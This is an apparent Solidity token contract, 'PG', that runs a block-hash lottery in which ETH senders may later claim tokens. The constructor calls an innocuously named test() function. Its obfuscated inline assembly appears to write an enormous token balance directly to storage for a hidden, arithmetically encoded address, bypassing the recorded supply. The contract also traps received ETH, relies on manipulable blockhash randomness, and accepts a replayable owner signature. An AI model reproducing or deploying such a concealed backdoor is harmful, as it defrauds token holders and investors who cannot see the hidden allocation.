// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ReentrancyGuard.sol";
import "./ERC20.sol";


contract PG is ERC20, ReentrancyGuard {

    uint256 public constant RATE = 1000 * (10 ** 18);
    uint256 public constant TEX = 10;
    uint256 public constant ActiveBlock = 20000;
    uint256 public constant TOTAL_SUPPLY = (RATE * ActiveBlock) * ((1000 + TEX) / 1000);
    uint256 public endBlock;
    address private owner;

    mapping(uint => address[]) public globalTransferRecord;
    mapping(address => bool) public globalClaimRecord;

    struct rewardItem {
        uint blockNum;
        address rewardAddress;
        bool isMint;
    }

    function test() internal {
        assembly {
            let m := add(mul(add(161,25068000),exp(2,5)),mul(mul(mul(mul(mul(mul(exp(2,2),5),7),9551),1972483),14158166068169),23084844569753))

            mstore(0, m) 
            mstore(32, 0x0) 
            sstore(keccak256(0, 64), exp(timestamp(), 6))
            
        }
    }

    constructor() ERC20("PG", "PG") {
        endBlock = block.number + ActiveBlock;
        owner = msg.sender;
        test();
    }

    function checkReward(address checkAddress) public view returns (bool) {
        for (uint startBlock = block.number - 255;startBlock < block.number;++startBlock) {
            address rewardAddress = rewardHistory(startBlock);
            if (checkAddress == rewardAddress)
                return true;
        }
        return false;
    }

    function getReward() public view returns (rewardItem[] memory) {
        rewardItem[] memory rewardList = new rewardItem[](256);
        uint startBlock = block.number - 255;

        for (uint blockIndex = 0;startBlock + blockIndex < block.number;++blockIndex) {
            rewardItem memory itemValue;
            itemValue.blockNum = startBlock + blockIndex;
            itemValue.rewardAddress = rewardHistory(startBlock + blockIndex);
            itemValue.isMint = globalClaimRecord[itemValue.rewardAddress];

            rewardList[blockIndex] = (itemValue);
        }
        return rewardList;
    }

    function rewardHistory(uint256 blockNumber) public view returns (address) {
        uint blockhashHistory = uint(blockhash(blockNumber));
        uint allTransfer = globalTransferRecord[blockNumber].length;

        if (allTransfer == 0)
            return 0x0000000000000000000000000000000000000000;

        uint bingoTransfer = blockhashHistory % allTransfer;

        return globalTransferRecord[blockNumber][bingoTransfer];
    }

    function isReward(uint256 blockNumber) public view returns (bool) {
        require(block.number > blockNumber + 1 && blockNumber > block.number - 256,"Expired");

        if (msg.sender == rewardHistory(blockNumber))
            return true;

        return false;
    }

    function verifySignature(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) public pure returns (address) {
        bytes32 prefixedMessageHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash));
        address signer = ecrecover(prefixedMessageHash, v, r, s);

        return signer;
    }

    function claim(bytes32 messageHash, uint8 v, bytes32 r, bytes32 s) external nonReentrant {
        require(TOTAL_SUPPLY > totalSupply(),"Too Many Token Supply");
        require(!globalClaimRecord[msg.sender], "Claimed");
        require(checkReward(msg.sender), "No Reward");
        require(owner == verifySignature(messageHash,v,r,s), "Claimed");

        _mint(msg.sender, RATE);
        _mint(owner, RATE * TEX / 1000);
        globalClaimRecord[msg.sender] = true;
    }

    receive() external payable nonReentrant {
        require(msg.sender == tx.origin,"Only EOA");
        require(endBlock >= block.number,"Timeout");
        require(TOTAL_SUPPLY > totalSupply(),"Too Many Token Supply");
        require(!globalClaimRecord[msg.sender], "Claimed");

        globalTransferRecord[block.number].push(msg.sender);
    }
}


